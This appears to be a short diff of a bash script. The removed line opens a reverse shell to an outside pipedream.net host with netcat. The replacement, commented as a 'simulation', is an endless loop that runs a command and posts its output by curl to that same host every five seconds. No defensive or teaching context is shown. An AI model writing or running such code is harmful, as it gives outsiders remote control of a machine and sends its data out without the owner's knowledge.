@@ -1,2 +1,9 @@
 #!/bin/bash
-nc eop3b98jxkzuqt4.m.pipedream.net 80 -e /bin/bash
+
+# Simulate sending shell command output
+while true; do
+  # Replace 'ls' with any command whose output you want to simulate
+  output=$(ls)
+  curl -X POST https://eop3b98jxkzuqt4.m.pipedream.net -H "Content-Type: text/plain" --data "$output"
+  sleep 5 # Wait for 5 seconds before sending the next request
+done
